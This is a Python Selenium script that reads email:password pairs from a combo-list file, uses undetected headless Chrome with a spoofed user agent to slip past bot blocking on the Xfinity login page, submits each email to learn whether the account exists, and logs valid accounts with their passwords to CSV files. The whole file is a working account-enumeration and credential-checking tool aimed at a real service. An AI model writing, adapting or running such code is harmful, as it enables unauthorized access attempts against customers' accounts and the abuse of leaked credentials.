# IMPORTS
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import undetected_chromedriver as uc
from time import sleep
from selenium.webdriver.support.ui import WebDriverWait
from datetime import datetime
import numpy as np
import pandas as pd

# configurando service para att webdriver automaticamente...
service = Service(ChromeDriverManager().install())
options = uc.ChromeOptions()
user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36' # se tiver "headless" no user_agent o site bloqueia o acesso
options.add_argument('user-agent={0}'.format(user_agent))
options.add_argument('--headless') # need to be headless or email_field doesn't works
options.add_argument('--no-sandbox')
options.add_argument('--mute-audio')
driver = uc.Chrome(use_subprocess=True, service=service, options=options)
driver.get("https://login.xfinity.com/login")

def valida_email(email):
    WebDriverWait(driver, 10).until(lambda x: x.find_element('xpath', '//input[@placeholder="Email, mobile, or username"]'), "not found email_field ")
    email_field = driver.find_element('xpath', '//input[@placeholder="Email, mobile, or username"]')
    email_field.send_keys(email)
    email_field.submit()
    print(f'{datetime.now()} - submit email.')
    sleep(7)
    input_field = driver.find_elements('xpath', '//input[@id = "passwd"]')
    if bool(input_field):
        print(f'{datetime.now()} - correo valido')
        return 'correo valido'
    else: 
        print(f'{datetime.now()} - correo malo')
        return 'correo malo'

resultado = []
emails_test = np.loadtxt(fname="PRUEBA XFINITI/test35.txt", dtype=str)

for i, email_test in enumerate(emails_test):
    email = email_test.split(':')[0]
    password = email_test.split(':')[1]
    print(f'{datetime.now()} | {i+1}° - pruebando correo: {email}')
    dict = {}
    dict['user'] = email
    dict['password'] = password  
    dict['resultado'] = valida_email(email)
    driver.get("https://login.xfinity.com/login")

    resultado.append(dict)
    if  i % 10 == 0:
        print(f'{datetime.now()} - realizando bkp da planilha...')
        dataset = pd.DataFrame(resultado)
        dataset.to_csv(f'bkps_cache/bkp-{i/10}.csv', index=False) 
    print('---------------------------------------------------------------------')

dataset = pd.DataFrame(resultado)
dataset.to_csv(f'result-{datetime.now().timestamp()}.csv', index=False) 
print('FINISH!!!!')